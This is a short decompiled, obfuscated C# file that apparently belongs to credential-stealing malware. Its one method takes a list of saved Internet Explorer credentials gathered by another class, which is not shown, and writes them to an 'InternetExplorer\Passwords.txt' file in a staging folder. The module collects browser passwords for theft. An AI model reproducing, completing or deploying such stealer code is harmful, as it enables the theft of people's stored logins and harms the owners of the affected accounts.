using System.Collections.Generic;
using System.IO;
using ns13;
using ns8;

namespace ns9;

internal sealed class Class32
{
	public static void smethod_0(string string_0)
	{
		List<GStruct10> list = Class33.smethod_0();
		if (list.Count != 0)
		{
			Directory.CreateDirectory(string_0 + "\\InternetExplorer");
			Class31.smethod_10(list, string_0 + "\\InternetExplorer\\Passwords.txt");
		}
	}
}
